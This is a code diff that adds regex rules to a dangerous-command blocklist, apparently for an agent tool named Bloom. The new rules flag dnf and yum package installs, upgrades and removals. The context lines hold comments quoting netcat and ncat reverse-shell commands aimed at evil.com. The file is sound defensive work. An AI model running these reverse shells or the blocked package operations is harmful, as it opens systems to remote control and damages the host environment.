@@ -421,6 +421,18 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // snap refresh <pkg> — Named snap refresh fetches and installs remote code from the Snap Store.
   // bare `snap refresh` (refreshes all installed snaps) is allowed.
   { pattern: /(?:^|[;&|]\s*)snap\s+refresh\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  // dnf install <pkg> — Fedora/RHEL/CentOS/Amazon Linux system package manager; pulls remote code.
+  { pattern: /(?:^|[;&|]\s*)dnf\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  // yum install <pkg> — Legacy RHEL/CentOS package manager; same risks as dnf.
+  { pattern: /(?:^|[;&|]\s*)yum\s+install\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  // dnf upgrade <pkg> — Named upgrade pulls and installs remote code; bare `dnf upgrade` (no package) is allowed.
+  { pattern: /(?:^|[;&|]\s*)dnf\s+upgrade\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  // yum update/upgrade <pkg> — Named update/upgrade fetches remote code; bare form (no package) is allowed.
+  { pattern: /(?:^|[;&|]\s*)yum\s+(?:update|upgrade)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "untrusted-package-installation" },
+  // dnf remove/erase <pkg> — Removing system-level packages can destroy tooling Bloom depends on.
+  { pattern: /(?:^|[;&|]\s*)dnf\s+(?:remove|erase)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "system-package-removal" },
+  // yum remove/erase <pkg> — Same destruction risk as dnf remove on RHEL-family systems.
+  { pattern: /(?:^|[;&|]\s*)yum\s+(?:remove|erase)\s+(?:-\S+\s+)*[a-zA-Z@]/, category: "system-package-removal" },
   // Reverse shell vectors — no download step; these directly open an outbound shell session:
   // nc -e /bin/bash evil.com 4444  — netcat with -e flag spawns a shell on connect
   // ncat -e /bin/bash evil.com 4444 — Nmap's ncat has identical -e/--exec semantics to nc and
